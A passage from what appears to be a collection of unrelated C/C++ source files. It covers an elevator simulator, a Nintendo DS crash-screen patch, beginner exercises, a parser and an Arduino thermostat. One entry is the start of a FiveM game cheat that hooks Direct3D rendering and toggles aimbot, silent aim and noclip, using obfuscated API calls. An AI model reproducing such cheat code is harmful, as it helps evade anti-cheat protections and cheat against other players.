currentRequest.priority << \"\\n\";\r\n\r\n            while (elevator.getCurrentFloor() != currentRequest.floor) {\r\n                elevator.setDirection(elevator.getCurrentFloor() < currentRequest.floor);\r\n                elevator.move();\r\n                output << \"Elevator at floor \" << elevator.getCurrentFloor() \r\n                       << \", moving \" << (elevator.getDirection() ? \"up\" : \"down\") << \"\\n\";\r\n            }\r\n\r\n            output << \"Request completed.\\n\";\r\n        }\r\n        return output.str();\r\n    }\r\n\r\n    std::string getStatus() {\r\n        std::ostringstream status;\r\n        status << \"Current Floor: \" << elevator.getCurrentFloor() << \"\\n\";\r\n        status << \"Direction: \" << (elevator.getDirection() ? \"Up\" : \"Down\") << \"\\n\";\r\n        status << \"Pending Requests: \" << requests.size() << \"\\n\";\r\n\r\n        if (!requests.empty()) {\r\n            status << \"Requests in queue:\\n\";\r\n            for (const auto& req : requests) {\r\n                status << \"  - Floor: \" << req.floor \r\n                       << \", Direction: \" << (req.direction ? \"Up\" : \"Down\")\r\n                       << \", Priority: \" << req.priority << \"\\n\";\r\n            }\r\n        } else {\r\n            status << \"No pending requests.\\n\";\r\n        }\r\n\r\n        return status.str();\r\n    }\r\n};\r\n\r\n// Global ElevatorSystem instance\r\nElevatorSystem elevatorSystem;\r\n\r\n// Exported C functions\r\nextern \"C\" {\r\n    EMSCRIPTEN_KEEPALIVE\r\n    void addRequest(int floor, bool direction, int priority) {\r\n        elevatorSystem.addRequest(floor, direction, priority);\r\n    }\r\n\r\n    EMSCRIPTEN_KEEPALIVE\r\n    char* processRequests() {\r\n        std::string result = elevatorSystem.processRequests();\r\n        char* cstr = new char[result.length() + 1];\r\n        std::strcpy(cstr, result.c_str());\r\n        return cstr;\r\n    }\r\n\r\n    EMSCRIPTEN_KEEPALIVE\r\n    char* getStatus() {\r\n        std::string status = elevatorSystem.getStatus();\r\n        char* cstr = new char[status.length() + 1];\r\n        std::strcpy(cstr, status.c_str());\r\n        return cstr;\r\n    }\r\n}",
    "#include \"nsmb_nitro.hpp\"\r\n\r\n#define DEBUG_WHITE 0xD000\r\n#define DEBUG_YELLOW 0xE000\r\n#define DEBUG_AQUA 0xF000\r\n\r\n#define COLOR_WHITE 0\r\n#define COLOR_YELLOW 1\r\n#define COLOR_AQUA 2\r\n\r\n#define SCR_POS(scrn, x, y) (scrn + 32 * y + x)\r\n\r\nasm(R\"(\r\n\tdebug_printf = 0x02006370\r\n\tdebug_clear = 0x02005E68\r\n\tdebug_drawTop = 0x02005EB0\r\n\tdebug_drawBottom = 0x020061E4\r\n)\");\r\nextern \"C\"\r\n{\r\n\tvoid debug_printf(const u16 colors[2], u16* dst, const char* str, ...);\r\n\tvoid debug_clear();\r\n\tvoid debug_drawTop();\r\n\tvoid debug_drawBottom();\r\n}\r\n\r\nnamespace CrashScreen {\r\n\r\nu16 isOpen = true;\r\nu16 lastIsOpen = false;\r\n\r\nstruct TextEntry\r\n{\r\n\tu8 color, screen;\r\n\tu16 pos;\r\n\tconst char* text;\r\n\r\n\tconstexpr TextEntry(u8 color, u8 screen, u8 x, u8 y, const char* text)\r\n\t{\r\n\t\tthis->color = color;\r\n\t\tthis->screen = screen;\r\n\t\tthis->pos = 2 * (32 * y + x);\r\n\t\tthis->text = text;\r\n\t}\r\n};\r\n\r\nconst static TextEntry textEntries[] = {\r\n\tTextEntry(COLOR_AQUA, 0, 1, 3, \"Uh oh, the game has crashed :(\"),\r\n\tTextEntry(COLOR_WHITE, 0, 2, 6, \"Please contact the dev team\"),\r\n\tTextEntry(COLOR_WHITE, 0, 3, 8, \"and send the crash dump\"),\r\n\tTextEntry(COLOR_WHITE, 0, 7, 12, \"Discord contacts:\"),\r\n\tTextEntry(COLOR_YELLOW, 0, 5, 14, \"Ndymario | @ndymario\"),\r\n\r\n\tTextEntry(COLOR_AQUA, 1, 2, 4, \"Possible actions:\"),\r\n\tTextEntry(COLOR_WHITE, 1, 4, 7, \"START  > This screen\"),\r\n\tTextEntry(COLOR_WHITE, 1, 4, 9, \"SELECT > Crash dump\"),\r\n\tTextEntry(COLOR_WHITE, 1, 4, 11, \"L + R  > Restart\")\r\n};\r\n\r\nconst static u16 colors[3][2] = {\r\n\t{ DEBUG_WHITE, DEBUG_WHITE },\r\n\t{ DEBUG_WHITE, DEBUG_YELLOW },\r\n\t{ DEBUG_WHITE, DEBUG_AQUA }\r\n};\r\n\r\nvoid drawDebugScreen()\r\n{\r\n\tdebug_drawTop();\r\n\tdebug_drawBottom();\r\n}\r\n\r\nvoid create()\r\n{\r\n\t// not sure if this actually helps\r\n\tfor (u32 i = 0; i < 4; i++)\r\n\t\tMI_StopDma(i);\r\n}\r\n\r\nvoid update()\r\n{\r\n\tif (CARD_IsPulledOut())\r\n\t{\r\n\t\tdrawDebugScreen();\r\n\t\treturn;\r\n\t}\r\n\r\n\tu16 input = PAD_Read();\r\n\r\n\tif (input & PAD_BUTTON_START)\r\n\t{\r\n\t\tisOpen = true;\r\n\t}\r\n\telse if (input & PAD_BUTTON_SELECT)\r\n\t{\r\n\t\tisOpen = false;\r\n\t}\r\n\telse if ((input & PAD_BUTTON_L) && (input & PAD_BUTTON_R))\r\n\t{\r\n\t\tOS_EnableIrq();\r\n\t\tOS_EnableInterrupts();\r\n\t\tOS_ResetSystem(0);\r\n\t\treturn;\r\n\t}\r\n\r\n\tif (lastIsOpen == isOpen)\r\n\t\treturn;\r\n\tlastIsOpen = isOpen;\r\n\r\n\tdebug_clear();\r\n\r\n\tif (!isOpen)\r\n\t{\r\n\t\tdrawDebugScreen();\r\n\t\treturn;\r\n\t}\r\n\r\n\tu16* screens[] = { *rcast<u16**>(0x020859EC), *rcast<u16**>(0x020859E8) };\r\n\r\n\tfor (u32 i = 0; i < sizeof(textEntries) / sizeof(TextEntry); i++)\r\n\t{\r\n\t\tconst TextEntry& e = textEntries[i];\r\n\t\tdebug_printf(colors[e.color], rcast<u16*>(rcast<u8*>(screens[e.screen]) + e.pos), e.text);\r\n\t}\r\n\r\n\tchar* buildTime = rcast<char*>(0x02088BB4);\r\n\tdebug_printf(colors[COLOR_YELLOW], SCR_POS(screens[1], 1, 22), buildTime);\r\n}\r\n\r\n}\r\n\r\nncp_repl(0x0200460C, \"NOP\") // Do not disconnect the cartridge\r\n\r\nncp_repl(0x02005DD8, \"MOV R2, #0x31\") // Background color\r\nncp_repl(0x0203985C, \".short 0x037F\") // Yellow font color\r\nncp_repl(0x0203987C, \".short 0x7F8F\") // Aqua font color\r\n\r\nncp_repl(0x02005BA8, \"MOV R5, #5; B 0x02005C1C\") // Auto-open debug screen on crash\r\n\r\nncp_repl(0x02005C20, \"NOP\") // Do not run draw top twice\r\nncp_repl(0x02005C2C, \"BL _ZN11CrashScreen6updateEv; NOP\") // Hook our updater\r\n\r\nasm(R\"(\r\nncp_jump(0x02005B24)\r\n\tSTRH    R0, [R2]\r\n\tBL      _ZN11CrashScreen6createEv\r\n\tB       0x02005B28\r\n)\");\r\n\r\n/*ncp_hook(0x020CDB2C, 9)\r\nvoid forceCrash()\r\n{\r\n\tOS_Terminate();\r\n}*/\r\n",
    "//Addition at Start \n#include<iostream>\nusing namespace std; \n\nclass List\n{\n    public: \n    int data; \n    List* next;\n    \n    // Constructor\n    List(int num)\n    {\n        data = num;\n        next = NULL;\n    }\n};\n\n// Function to insert a new node at the head\nvoid insert_head(List* &head, int data)\n{\n    List* new_node = new List(data);  // Create a new node\n    new_node->next = head;  // Point new node to the current head\n    head = new_node;  // Update head to the new node\n}\n\n// Function to display the linked list\nvoid display(List* head)\n{\n    List* temp = head; \n    while (temp != NULL)\n    {\n        cout << temp->data << \" -> \";  // Print data\n        temp = temp->next;  // Move to the next node\n    }\n    cout << \"NULL\" << endl;  // End of list\n}\n\nint main()\n{\n    List* head = NULL;  // Initialize the head to NULL\n    insert_head(head, 30);  // Insert first node\n    display(head);  // Display list\n    \n    insert_head(head, 32);  // Insert second node\n    display(head);  // Display list\n    \n    insert_head(head, 35);  // Insert third node\n    display(head);  // Display list\n\n    return 0;\n}\n\n\n/*\nOUTPUT: \n30 -> NULL\n32 -> 30 -> NULL\n35 -> 32 -> 30 -> NULL\n*/\n\n",
    "#include <iostream>\n\n// Function to add two numbers\ndouble add(double num1, double num2) {\n    return num1 + num2;\n}\n\n// Function to subtract two numbers\ndouble subtract(double num1, double num2) {\n    return num1 - num2;\n}\n\n// Function to multiply two numbers OF HOW TO BE GOOD\ndouble multiply(double num1, double num2) {\n    return num1 * num2;\n}\n\n// Function to divide two numbers\ndouble divide(double num1, double num2) {\n    if (num2 == 0) {\n        std::cerr << \"Error: Division by zero is not allowed.\" << std::endl;\n        exit(1);\n    }\n    return num1 / num2;\n}\n\nint main() {\n    double num1, num2;\n    char operation;\n\n    // Ask the user for the first number\n    std::cout << \"Enter the first number: \";\n    std::cin >> num1;\n\n    // Ask the user for the operation\n    std::cout << \"Enter the operation (+, -, *, /): \";\n    std::cin >> operation;\n\n    // Ask the user for the second number\n    std::cout << \"Enter the second number: \";\n    std::cin >> num2;\n\n    // Perform the operation\n    switch (operation) {\n        case '+':\n            std::cout << \"Result: \" << add(num1, num2) << std::endl;\n            break;\n        case '-':\n            std::cout << \"Result: \" << subtract(num1, num2) << std::endl;\n            break;\n        case '*':\n            std::cout << \"Result: \" << multiply(num1, num2) << std::endl;\n            break;\n        case '/':\n            std::cout << \"Result: \" << divide(num1, num2) << std::endl;\n            break;\n        default:\n            std::cerr << \"Error: Invalid operation.\" << std::endl;\n            break;\n    }\n\n    return 0;\n}",
    "\ufeff#include <iostream>\r\n#include <vector>\r\n\r\nvoid InputAmountOfArrayElements(int& n) {\r\n    std::cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435 n - \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u043e\u0432 \u043e\u0434\u043d\u043e\u043c\u0435\u0440\u043d\u043e\u0433\u043e \u043c\u0430\u0441\u0441\u0438\u0432\u0430.\" << std::endl;\r\n    while (true) {\r\n        std::cout << \"n: \";\r\n        std::cin >> n;\r\n        if (n > 0) break;\r\n        else std::cout << \"\u0412\u044b \u043d\u0435\u0432\u0435\u0440\u043d\u043e \u0432\u0432\u0435\u043b\u0438 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435 n. \u041f\u043e\u043f\u0440\u043e\u0431\u0443\u0439\u0442\u0435 \u0441\u043d\u043e\u0432\u0430.\" << std::endl;\r\n    }\r\n}\r\n\r\nvoid InputArrayElements(std::vector<int>& vector, const int n) {\r\n    std::cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u044b \u043c\u0430\u0441\u0441\u0438\u0432\u0430: \";\r\n    int element;\r\n    for (size_t i = 0; i < n; i++) {\r\n        std::cin >> element;\r\n        vector.push_back(element);\r\n    }\r\n}\r\n\r\nint FindMaxElement(const int n, std::vector<int> vector, int stackOveflow = 100) {\r\n    if (stackOveflow == 0) {\r\n        std::cout << \"\u041c\u0430\u0441\u0441\u0438\u0432 \u0441\u043b\u0438\u0448\u043a\u043e\u043c \u043e\u0433\u0440\u043e\u043c\u043d\u044b\u0439. \u0421\u0442\u044d\u043a \u043f\u0435\u0440\u0435\u043f\u043e\u043b\u043d\u0435\u043d. \u041e\u0448\u0438\u0431\u043a\u0430 - NULL.\" << std::endl;\r\n        exit(NULL);\r\n    }\r\n    else {\r\n        if (vector.size() == 1) return vector[0];\r\n        else {\r\n            stackOveflow -= 1;\r\n            std::vector<int> newVector;\r\n            std::copy(std::begin(vector) + 1, std::end(vector), std::back_inserter(newVector));\r\n            return std::max(vector[0], FindMaxElement(n-1, newVector, stackOveflow));\r\n        }\r\n    }\r\n}\r\n\r\nint main()\r\n{\r\n    setlocale(LC_ALL, \"ru\");\r\n    int n;\r\n    std::vector<int> vector;\r\n    InputAmountOfArrayElements(n);\r\n    InputArrayElements(vector, n);\r\n    std::cout << \"\u041c\u0430\u043a\u0441\u0438\u043c\u0430\u043b\u044c\u043d\u044b\u0439 \u044d\u043b\u0435\u043c\u0435\u043d\u0442 \u043c\u0430\u0441\u0441\u0438\u0432\u0430: \" << FindMaxElement(n, vector) << std::endl;\r\n}\r\n\r\n",
    "// This file was automatically generated by EbnfStudio; don't modify it!\n#include \"LnSynTree.h\"\nusing namespace Ln;\n\nSynTree::SynTree(quint16 r, const Token& t ):d_tok(r){\n\td_tok.d_lineNr = t.d_lineNr;\n\td_tok.d_colNr = t.d_colNr;\n\td_tok.d_sourcePath = t.d_sourcePath;\n}\n\nconst char* SynTree::rToStr( quint16 r ) {\n\tswitch(r) {\n\t\tcase R_AddOperator: return \"AddOperator\";\n\t\tcase R_ArrayType: return \"ArrayType\";\n\t\tcase R_BaseType: return \"BaseType\";\n\t\tcase R_Case: return \"Case\";\n\t\tcase R_CaseLabelList: return \"CaseLabelList\";\n\t\tcase R_CaseStatement: return \"CaseStatement\";\n\t\tcase R_ConstDeclaration: return \"ConstDeclaration\";\n\t\tcase R_ConstExpression: return \"ConstExpression\";\n\t\tcase R_DeclarationSequence: return \"DeclarationSequence\";\n\t\tcase R_DictType: return \"DictType\";\n\t\tcase R_ElseStatement: return \"ElseStatement\";\n\t\tcase R_ElsifStatement: return \"ElsifStatement\";\n\t\tcase R_ExitStatement: return \"ExitStatement\";\n\t\tcase R_ExpList: return \"ExpList\";\n\t\tcase R_FPSection: return \"FPSection\";\n\t\tcase R_FieldList: return \"FieldList\";\n\t\tcase R_ForStatement: return \"ForStatement\";\n\t\tcase R_FormalParameters: return \"FormalParameters\";\n\t\tcase R_FormalType: return \"FormalType\";\n\t\tcase R_IdentList: return \"IdentList\";\n\t\tcase R_IfStatement: return \"IfStatement\";\n\t\tcase R_ImportList: return \"ImportList\";\n\t\tcase R_LabelRange: return \"LabelRange\";\n\t\tcase R_LoopStatement: return \"LoopStatement\";\n\t\tcase R_Luon: return \"Luon\";\n\t\tcase R_MetaActuals: return \"MetaActuals\";\n\t\tcase R_MetaParams: return \"MetaParams\";\n\t\tcase R_MetaSection: return \"MetaSection\";\n\t\tcase R_MulOperator: return \"MulOperator\";\n\t\tcase R_NamedType: return \"NamedType\";\n\t\tcase R_ProcedureBody: return \"ProcedureBody\";\n\t\tcase R_ProcedureDeclaration: return \"ProcedureDeclaration\";\n\t\tcase R_ProcedureHeading: return \"ProcedureHeading\";\n\t\tcase R_ProcedureType: return \"ProcedureType\";\n\t\tcase R_Receiver: return \"Receiver\";\n\t\tcase R_RecordType: return \"RecordType\";\n\t\tcase R_RepeatStatement: return \"RepeatStatement\";\n\t\tcase R_ReturnStatement: return \"ReturnStatement\";\n\t\tcase R_ReturnType: return \"ReturnType\";\n\t\tcase R_SimpleExpression: return \"SimpleExpression\";\n\t\tcase R_StatementSequence: return \"StatementSequence\";\n\t\tcase R_TypeDeclaration: return \"TypeDeclaration\";\n\t\tcase R_VariableDeclaration: return \"VariableDeclaration\";\n\t\tcase R_WhileStatement: return \"WhileStatement\";\n\t\tcase R_assignmentOrProcedureCall: return \"assignmentOrProcedureCall\";\n\t\tcase R_block: return \"block\";\n\t\tcase R_comment_: return \"comment\";\n\t\tcase R_component: return \"component\";\n\t\tcase R_constEnum: return \"constEnum\";\n\t\tcase R_constructor: return \"constructor\";\n\t\tcase R_designator: return \"designator\";\n\t\tcase R_directive_: return \"directive\";\n\t\tcase R_enumeration: return \"enumeration\";\n\t\tcase R_expression: return \"expression\";\n\t\tcase R_factor: return \"factor\";\n\t\tcase R_hexstringdelim_: return \"hexstringdelim\";\n\t\tcase R_identdef: return \"identdef\";\n\t\tcase R_import: return \"import\";\n\t\tcase R_label: return \"label\";\n\t\tcase R_length: return \"length\";\n\t\tcase R_literal: return \"literal\";\n\t\tcase R_module: return \"module\";\n\t\tcase R_number: return \"number\";\n\t\tcase R_procedure: return \"procedure\";\n\t\tcase R_qualident: return \"qualident\";\n\t\tcase R_relation: return \"relation\";\n\t\tcase R_selector: return \"selector\";\n\t\tcase R_statement: return \"statement\";\n\t\tcase R_term: return \"term\";\n\t\tcase R_type: return \"type\";\n\t\tcase R_variableOrFunctionCall: return \"variableOrFunctionCall\";\n\tdefault: if(r<R_First) return tokenTypeName(r); else return \"\";\n}\n}\n",
    "#include <iostream>\n#include <cmath>\n#include \"shell.h\"\n\nbool Shell::HasOperation(std::vector<Token> tokens)\n{\n    // Loop Through Tokens\n    for (int i=0; i<int(tokens.size()); i++)\n    {\n        std::string value = tokens[i].GetValue();\n        // Check For Operator\n        if (value==Operator::keys[Operator::OPERATOR_ADD] ||\n            value==Operator::keys[Operator::OPERATOR_SUB] ||\n            value==Operator::keys[Operator::OPERATOR_MUL] ||\n            value==Operator::keys[Operator::OPERATOR_DIV] ||\n            value==Operator::keys[Operator::OPERATOR_MOD] ||\n            value==Operator::keys[Operator::OPERATOR_POW])\n        { return true; }\n    }\n    return HasLogic(tokens);\n}\n\ninline bool Shell::HasLogic(std::vector<Token> tokens)\n{\n    // Loop Through Tokens\n    for (int i=0; i<int(tokens.size()); i++)\n    {\n        std::string value = tokens[i].GetValue();\n        // Check For Operator\n        if (value==Operator::keys[Operator::OPERATOR_SET] ||\n            value==Operator::keys[Operator::OPERATOR_NOT] ||\n            value==Operator::keys[Operator::OPERATOR_LESSER] ||\n            value==Operator::keys[Operator::OPERATOR_GREATER] ||\n            value==Operator::keys[Operator::OPERATOR_LOGIC_AND] ||\n            value==Operator::keys[Operator::OPERATOR_LOGIC_OR] ||\n            value==Operator::keys[Operator::OPERATOR_AND] ||\n            value==Operator::keys[Operator::OPERATOR_OR] ||\n            value==Operator::keys[Operator::OPERATOR_LESSER_EQUAL] ||\n            value==Operator::keys[Operator::OPERATOR_GREATER_EQUAL] ||\n            value==Operator::keys[Operator::OPERATOR_NOT_EQUAL] ||\n            value==Operator::keys[Operator::OPERATOR_EQUALS])\n        { return true; }\n    }\n    return false;\n}\n\ninline int Shell::FirstOperationIndex(std::vector<Token> tokens, int state)\n{\n    if (state==MathState::MATH_LOG) { return FirstLogicIndex(tokens); }\n    int operation_index=-1;\n    // Loop Through Tokens\n    for (int i=0; i<int(tokens.size()); i++)\n    {\n        std::string value = tokens[i].GetValue();\n        bool is_op=tokens[i].GetType()==SyntaxType::TYPE_OPERATOR, L=false, R=false;\n        if (i>0 && is_op) { L=CanComputeToken(tokens[i-1]); } if (i<int(tokens.size()-1) && is_op) { R=CanComputeToken(tokens[i+1]); }\n        // Check If It's A Valid Problem\n        if ((L && R) || R)\n        {\n            // Check Addition / Subtraction\n            if      (state==MathState::MATH_A_S &&\n                (value==Operator::keys[Operator::OPERATOR_ADD] ||\n                value==Operator::keys[Operator::OPERATOR_SUB]))\n            { operation_index = i; break; }\n            // Check Multiplication / Division / Modulo\n            else if (state==MathState::MATH_M_D &&\n                ((value==Operator::keys[Operator::OPERATOR_MUL] ||\n                value==Operator::keys[Operator::OPERATOR_DIV]) ||\n                value==Operator::keys[Operator::OPERATOR_MOD]))\n            { operation_index = i; break; }\n            // Check Exponents\n            else if (state==MathState::MATH_POW &&\n                (value==Operator::keys[Operator::OPERATOR_POW]))\n            { operation_index = i; break; }\n            // Check Logic\n            else if (state>MathState::MATH_A_S &&\n                (value==Operator::keys[Operator::OPERATOR_SET] ||\n                value==Operator::keys[Operator::OPERATOR_NOT] ||\n                value==Operator::keys[Operator::OPERATOR_LESSER] ||\n                value==Operator::keys[Operator::OPERATOR_GREATER] ||\n                value==Operator::keys[Operator::OPERATOR_LOGIC_AND] ||\n                value==Operator::keys[Operator::OPERATOR_LOGIC_OR] ||\n                value==Operator::keys[Operator::OPERATOR_AND] ||\n                value==Operator::keys[Operator::OPERATOR_OR] ||\n                value==Operator::keys[Operator::OPERATOR_LESSER_EQUAL] ||\n                value==Operator::keys[Operator::OPERATOR_GREATER_EQUAL] ||\n                value==Operator::keys[Operator::OPERATOR_NOT_EQUAL] ||\n                value==Operator::keys[Operator::OPERATOR_EQUALS]))\n            { operation_index = i; break; }\n        }\n    }\n    return operation_index;\n}\n\ninline int Shell::FirstLogicIndex(std::vector<Token> tokens)\n{\n    int operation_index=-1;\n    // Loop Through Tokens\n    for (int i=0; i<int(tokens.size()); i++)\n    {\n        std::string value = tokens[i].GetValue();\n        int L=false, R=false, _R=false;\n        if (i>0) { L=CanComputeToken(tokens[i-1]); }\n        if (i<int(tokens.size()-1))\n        {\n            Token right_token = tokens.at(i+1);\n            R=CanComputeToken(right_token);\n            // Check For (<=, >=, !=, ||, &&)\n            _R=(right_token.GetValue()==Operator::keys[Operator::OPERATOR_SET] ||\n                right_token.GetValue()==Operator::keys[Operator::OPERATOR_LOGIC_AND] ||\n                right_token.GetValue()==Operator::keys[Operator::OPERATOR_LOGIC_OR]);\n        }\n        // Check For Operator Keys\n        for (int o=Operator::OPERATOR_SET; o<=Operator::OPER",
    "#include \"Core.hpp\"\r\n\r\n#include \"d3d_Hook.hpp\"\r\n#include \"Menu.hpp\"\r\n#include \"Classes.hpp\"\r\n#include \"Settings.hpp\"\r\n#include \"Visuals.hpp\"\r\n#include \"Player.hpp\"\r\n#include \"Aimbot.hpp\"\r\n#include \"Weapon.hpp\"\r\n#include \"NoClip.hpp\"\r\n#include \"vehicule.hpp\"\r\n#include \"auth.hpp\"\r\n#include \"Fonts.hpp\"\r\n#include <imguinotify.hpp>\r\n#include <program.hpp>\r\n\r\n#pragma comment(lib, \"proxine.lib\")\r\n\r\n//#include \"Snow.hpp\"\r\nextern LRESULT ImGui_ImplWin32_WndProcHandler(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);\r\n// you need those for snowflake\r\n#define WINDOW_WIDTH  1920\r\n#define WINDOW_HEIGHT 1080\r\nbool IsValid = false;\r\n\r\nvoid Kouloumbou()\r\n{\r\n\tstd::exit(-1);\r\n}\r\nvoid InitImGui()\r\n{\r\n\tusing namespace DirectX;\r\n\r\n\tImGui::CreateContext();\r\n\r\n\tImGuiIO* io = &ImGui::GetIO();\r\n\tio->ConfigFlags = ImGuiConfigFlags_NoMouseCursorChange;\r\n\tio->IniFilename = nullptr;\r\n\tio->LogFilename = nullptr;\r\n\r\n\tstatic const ImWchar icons_ranges[] = { ICON_MIN_FA, ICON_MAX_FA, 0 };\r\n\tImFontConfig icons_config;\r\n\r\n\ticons_config.MergeMode = true;\r\n\ticons_config.PixelSnapH = true;\r\n\t\r\n\tImFontConfig rubik;\r\n\trubik.FontDataOwnedByAtlas = false;\r\n\t\r\n\r\n\tio->Fonts->AddFontFromMemoryTTF(const_cast<uint8_t*>(Rubik), sizeof(Rubik), 15.5f, &rubik);\r\n\tio->Fonts->AddFontFromMemoryCompressedTTF(font_awesome_data, font_awesome_size, 25.f, &icons_config, icons_ranges);\r\n\tio->Fonts->AddFontFromMemoryCompressedTTF(font_awesome_data, font_awesome_size, 25.f, &icons_config, icons_ranges);\r\n\tMenu::BiggestIcon = io->Fonts->AddFontFromMemoryCompressedTTF(font_awesome_data, font_awesome_size, 40.f, NULL, icons_ranges);\r\n\tMenu::BiggestFont = io->Fonts->AddFontFromMemoryTTF(const_cast<uint8_t*>(Rubik), sizeof(Rubik), 21.f, &rubik);\r\n\tMenu::littleFont = io->Fonts->AddFontFromMemoryTTF(const_cast<uint8_t*>(Rubik), sizeof(Rubik), 17.5f, &rubik);\r\n\r\n\tImGui_ImplWin32_Init(Window);\r\n\tImGui_ImplDX11_Init(pDevice, pContext);\r\n\t\r\n\t//Snowflake::CreateSnowFlakes(snow, SNOW_LIMIT, 5.f/*minimum size*/, 25.f/*maximum size*/, 0/*imgui window x position*/, 0/*imgui window y position*/, WINDOW_WIDTH, WINDOW_HEIGHT, Snowflake::vec3(0.f, 0.005f)/*gravity*/, IM_COL32(255,255, 255, 100)/*color*/);\r\n\r\n}\r\n\r\n\r\nLRESULT __stdcall WindowHandler(const HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)\r\n{\r\n\tif (Menu::Open)\r\n\t{\r\n\t\tImGui_ImplWin32_WndProcHandler(hWnd, uMsg, wParam, lParam);\r\n\t\treturn true;\r\n\t}\r\n\r\n\treturn SAFE_CALL(CallWindowProcA)(DirectX::WindowEx, hWnd, uMsg, wParam, lParam);\r\n}\r\n\r\n\r\nbool BindD3DInfo(IDXGISwapChain* pSwapChain)\r\n{\r\n\tif (SUCCEEDED(pSwapChain->GetDevice(__uuidof(ID3D11Device), (void**)&DirectX::pDevice)))\r\n\t{\r\n\t\tDirectX::pDevice->GetImmediateContext(&DirectX::pContext);\r\n\t\tDXGI_SWAP_CHAIN_DESC sd;\r\n\r\n\t\tpSwapChain->GetDesc(&sd);\r\n\t\tDirectX::Window = sd.OutputWindow;\r\n\t\t\r\n\t\r\n\t\tID3D11Texture2D* pBackBuffer;\r\n\r\n\t\tpSwapChain->GetBuffer(0, __uuidof(ID3D11Texture2D), (LPVOID*)&pBackBuffer);\r\n\t\tDirectX::pDevice->CreateRenderTargetView(pBackBuffer, 0, &DirectX::renderTargetView);\r\n\t\tpBackBuffer->Release();\r\n\r\n\t\tDirectX::WindowEx = (WNDPROC)LI_FN(SetWindowLongPtrA).safe_cached()(DirectX::Window, GWLP_WNDPROC, (LONG_PTR)WindowHandler);\r\n\r\n\t\tInitImGui();\r\n\r\n\t\tMenu::FirstTime = false;\r\n\r\n\t\tMenu::Style();\r\n\r\n\t\treturn true;\r\n\t}\r\n\r\n\treturn false;\r\n}\r\nbool AuthConnected = false;\r\n\r\nchar Licence[50] = \"\";\r\nchar UserName[20] = \"\";\r\nchar RgPassWord[20] = \"\";\r\nchar RgUserName[20] = \"\";\r\nstatic int Tabs = 2;\r\nstatic int Checks = 0;\r\nHRESULT __stdcall PresentHook(IDXGISwapChain* pSwapChain, UINT SyncInterval, UINT Flags)\r\n{\r\n\tif (Menu::FirstTime)\r\n\t{\r\n\r\n\t\tif (!BindD3DInfo(pSwapChain))\r\n\t\t\treturn DirectX::OriginalPresent(pSwapChain, SyncInterval, Flags);\r\n\t}\r\n\r\n\tImGui_ImplDX11_NewFrame();\r\n\tImGui_ImplWin32_NewFrame();\r\n\tImGui::NewFrame();\r\n\r\n\tif (SAFE_CALL(GetAsyncKeyState)(VK_INSERT) & 1)\r\n\t{\r\n\r\n\t\tMenu::Open = !Menu::Open;\r\n\t}\r\n\tif (SAFE_CALL(GetAsyncKeyState)(0x58) & 1)\r\n\t{\r\n\t\tSettings::Player::NoClip = !Settings::Player::NoClip;\r\n\t}\r\n\tImGui::GetIO().MouseDrawCursor = Menu::Open;\r\n\tImGui::GetIO().WantCaptureKeyboard = Menu::Open;\r\n\tif (AuthConnected)\r\n\t{\r\n\t\t\r\n\r\n\t\tVisuals::Hook();\r\n\t\tPlayers::Hook();\r\n\t\tif (!Settings::Aimbot::silentaim)\r\n\t\t{\r\n\t\t\tAimbot::Hook();\r\n\r\n\t\t}\r\n\t\tif (Settings::Aimbot::silentaim && Settings::Aimbot::aimmousewhilesilent)\r\n\t\t{\r\n\t\t\tAimbot::Hook();\r\n\t\t}\r\n\t\tif (Settings::Aimbot::Aimbot && Settings::Aimbot::silentaim)\r\n\t\t{\r\n\t\t//\tAimbot::aimbot_silent();\r\n\r\n\t\t}\r\n\r\n\t\tWeapon::Hook();\r\n\t\tNoClip::Hook();\r\n\t\tVehicule::Hook();\r\n\r\n\t\tif (Settings::Aimbot::Draw_Fov)\r\n\t\t{\r\n\r\n\t\t\t//\tImGui::GetBackgroundDrawList()->AddCircle(ImVec2(1920 / 2, 1080 / 2), Option::AimbotFov, IM_COL32(255, 255, 255, 255), 40.f,1.f);\r\n\t\t\tImGui::GetBackgroundDrawList()->AddCircleFilled(ImVec2(FiveM::WindowSize.x / 2, FiveM::WindowSize.y / 2), Settings::Aimbot::AimbotFov, IM_COL32(0, 0, 0, 140), 40.F);\r\n\t\t}\r\n\r\n\t\tif (Settings::Aimbot::crosshair)\r\n\t\t{\r\n\t\t\tImGui::GetBackgroundDrawList()->AddLine(ImVec2(955, 540), ImVec2(965, 540), ImColor(255, 255, 255, 255), 1);\r\n\t\t\tImGui::GetBackgroundDrawList()-",
    "#include <OneWire.h>\n#include <DallasTemperature.h>\n#include <Arduino.h>\n#include <Wire.h>\n#include <LiquidCrystal_PCF8574.h>\n\nLiquidCrystal_PCF8574 lcd(0x27);  // set the LCD address to 0x27 for a 16 chars and 2 line display\n\nint show = -1;\nfloat temptotal = 0;\nconst int botao1 = 5;\nconst int botao2 = 6;\nconst int botao3 = 7;\nconst int PINO_ONEWIRE = 12;\nconst int PINO_RELE = 3;\n//const int PINO_FAN = 2;\n\n// 2 custom characters\nbyte dotOff[] = { 0b00000, 0b01110, 0b10001, 0b10001,\n                  0b10001, 0b01110, 0b00000, 0b00000 };\nbyte dotOn[] = { 0b00000, 0b01110, 0b11111, 0b11111,\n                 0b11111, 0b01110, 0b00000, 0b00000 };\n\nOneWire oneWire(PINO_ONEWIRE);       // Cria um objeto OneWire\nDallasTemperature sensor(&oneWire);  // Informa a referencia da biblioteca dallas temperature para Biblioteca onewire\nDeviceAddress endereco_temp;         // Cria um endereco temporario da leitura do sensor\n\nvoid setup() {\n  int error;\n\n  pinMode(botao1, INPUT);\n  pinMode(botao2, INPUT);\n  pinMode(botao3, INPUT);  // Adicionando pino 3 para leitura\n\n  pinMode(PINO_RELE, OUTPUT);\n\n  Serial.begin(115200);  // Definido apenas uma taxa de baud\n  Serial.println(\"LCD...\");\n  sensor.begin();\n\n  Wire.begin();\n  Wire.beginTransmission(0x27);\n  error = Wire.endTransmission();\n  Serial.print(\"Error: \");\n  Serial.print(error);\n\n  if (error == 0) {\n    Serial.println(\": LCD found.\");\n    show = 